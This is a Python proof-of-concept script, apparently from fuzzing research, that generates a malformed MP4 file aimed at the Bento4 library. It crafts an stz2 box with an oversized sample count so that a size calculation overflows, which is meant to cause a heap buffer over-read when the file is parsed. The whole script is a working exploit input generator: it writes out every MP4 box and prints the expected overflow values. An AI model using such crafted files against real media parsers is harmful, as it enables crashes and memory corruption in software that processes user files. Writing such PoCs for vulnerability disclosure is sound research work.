#!/usr/bin/env python3
"""
PoC generator for VULN 002: Bento4 AP4_Stz2Atom integer overflow -> heap buffer overflow
stz2 box with field_size=8, sample_count=0x20000001 triggers:
  - m_Entries.SetItemCount(0x20000001) tries to allocate ~512MB
  - table_size = (0x20000001 * 8 + 7) / 8 overflows (unsigned int) to 1
  - buffer = new unsigned char[1] -- tiny allocation
  - loop: m_Entries[i] = buffer[i] for i in 0..0x20000000 -- heap buffer over-read
"""
import struct

OUTPUT = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4_h/vuln_002.mp4'

def box(type_str, data):
    """Build a plain box: size(4BE) + type(4) + data."""
    size = 8 + len(data)
    return struct.pack('>I', size) + type_str.encode('latin-1') + data

def full_box(type_str, version, flags, data):
    """Build a FullBox: size(4BE) + type(4) + version(1) + flags(3) + data."""
    size = 12 + len(data)
    return struct.pack('>I', size) + type_str.encode('latin-1') + struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data

# --- ftyp box (16 bytes) ---
ftyp_data = b'M4A ' + struct.pack('>I', 0)   # major_brand + minor_version (no compat brands)
ftyp = box('ftyp', ftyp_data)
assert len(ftyp) == 16

# --- mvhd box (version=0, 108 bytes) ---
# creation_time(4) + modification_time(4) + timescale(4) + duration(4)
# rate(4)=0x00010000 + volume(2)=0x0100 + reserved(10)
# matrix(36) + pre_defined(24) + next_track_id(4)
identity_matrix = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_data = (
    struct.pack('>IIII', 0, 0, 1000, 0) +   # times + timescale + duration
    struct.pack('>I', 0x00010000) +           # rate = 1.0
    struct.pack('>H', 0x0100) +               # volume = 1.0
    b'\x00' * 10 +                            # reserved
    identity_matrix +                          # matrix (36 bytes)
    b'\x00' * 24 +                            # pre_defined (6 * 4)
    struct.pack('>I', 2)                       # next_track_id
)
mvhd = full_box('mvhd', 0, 0, mvhd_data)
assert len(mvhd) == 108

# --- tkhd box (version=0, 92 bytes) ---
# creation_time(4) + modification_time(4) + track_id(4) + reserved(4)
# duration(4) + reserved(8) + layer(2) + alternate_group(2)
# volume(2) + reserved(2) + matrix(36) + width(4) + height(4)
tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +  # ctime, mtime, track_id, reserved, duration
    b'\x00' * 8 +                             # reserved
    struct.pack('>HHHH', 0, 0, 0, 0) +        # layer, alt_group, volume, reserved
    identity_matrix +                          # matrix
    struct.pack('>II', 0, 0)                   # width, height
)
tkhd = full_box('tkhd', 0, 0, tkhd_data)
assert len(tkhd) == 92

# --- mdhd box (version=0, 32 bytes) ---
mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0) +   # ctime, mtime, timescale, duration
    struct.pack('>HH', 0, 0)                   # language, pre_defined
)
mdhd = full_box('mdhd', 0, 0, mdhd_data)
assert len(mdhd) == 32

# --- hdlr box (33 bytes) ---
# pre_defined(4) + handler_type(4) + reserved(12) + name(1, null terminated)
hdlr_data = (
    struct.pack('>I', 0) +        # pre_defined
    b'soun' +                      # handler_type
    b'\x00' * 12 +                 # reserved
    b'\x00'                        # name (empty null-terminated string)
)
hdlr = full_box('hdlr', 0, 0, hdlr_data)
assert len(hdlr) == 33

# --- smhd box (16 bytes) ---
smhd_data = struct.pack('>HH', 0, 0)   # balance, reserved
smhd = full_box('smhd', 0, 0, smhd_data)
assert len(smhd) == 16

# --- url box (self-contained, flags=1, 12 bytes) ---
url_entry = full_box('url ', 0, 1, b'')
assert len(url_entry) == 12

# --- dref box (28 bytes) ---
dref_data = struct.pack('>I', 1) + url_entry   # entry_count=1 + url entry
dref = full_box('dref', 0, 0, dref_data)
assert len(dref) == 28

# --- dinf box (36 bytes) ---
dinf = box('dinf', dref)
assert len(dinf) == 36

# --- stsd box (16 bytes) ---
stsd_data = struct.pack('>I', 0)   # entry_count=0
stsd = full_box('stsd', 0, 0, stsd_data)
assert len(stsd) == 16

# --- stts box (16 bytes) ---
stts_data = struct.pack('>I', 0)
stts = full_box('stts', 0, 0, stts_data)
assert len(stts) == 16

# --- stsc box (16 bytes) ---
stsc_data = struct.pack('>I', 0)
stsc = full_box('stsc', 0, 0, stsc_data)
assert len(stsc) == 16

# --- MALICIOUS stz2 box (20 bytes) ---
# Full atom header (12 bytes): size=20, type='stz2', version=0, flags=0
# reserved(3) + field_size=8(1) + sample_count=0x20000001(4) = 8 bytes
# Total = 20 bytes, no actual table entries
SAMPLE_COUNT = 0x20000001
FIELD_SIZE   = 8
stz2_size    = 20
stz2  = struct.pack('>I', stz2_size)   # size
stz2 += b'stz2'                         # type
stz2 += struct.pack('>B', 0)            # version
stz2 += b'\x00\x00\x00'                # flags
stz2 += b'\x00\x00\x00'                # reserved (3 bytes)
stz2 += struct.pack('>B', FIELD_SIZE)  # field_size
stz2 += struct.pack('>I', SAMPLE_COUNT) # sample_count = 0x20000001
assert len(stz2) == 20

# --- stco box (16 bytes) ---
stco_data = struct.pack('>I', 0)
stco = full_box('stco', 0, 0, stco_data)
assert len(stco) == 16

# --- stbl box ---
stbl_content = stsd + stts + stsc + stz2 + stco
stbl = box('stbl', stbl_content)
assert len(stbl) == 8 + 16 + 16 + 16 + 20 + 16

# --- minf box ---
minf_content = smhd + dinf + stbl
minf = box('minf', minf_content)

# --- mdia box ---
mdia_content = mdhd + hdlr + minf
mdia = box('mdia', mdia_content)

# --- trak box ---
trak_content = tkhd + mdia
trak = box('trak', trak_content)

# --- moov box ---
moov_content = mvhd + trak
moov = box('moov', moov_content)

# --- Final file ---
mp4 = ftyp + moov

print(f"[*] Writing {len(mp4)} bytes to {OUTPUT}")
print(f"[*] stz2: size={stz2_size}, field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
print(f"[*] Expected integer overflow: table_size = ({SAMPLE_COUNT} * {FIELD_SIZE} + 7) / 8")
overflow_32 = ((SAMPLE_COUNT * FIELD_SIZE + 7) & 0xFFFFFFFF) // 8
print(f"[*]   32-bit unsigned result: {overflow_32} (overflows to tiny value)")
print(f"[*]   64-bit result:          {(SAMPLE_COUNT * FIELD_SIZE + 7) // 8} (huge, >512MB)")

with open(OUTPUT, 'wb') as f:
    f.write(mp4)
print(f"[*] Done.")
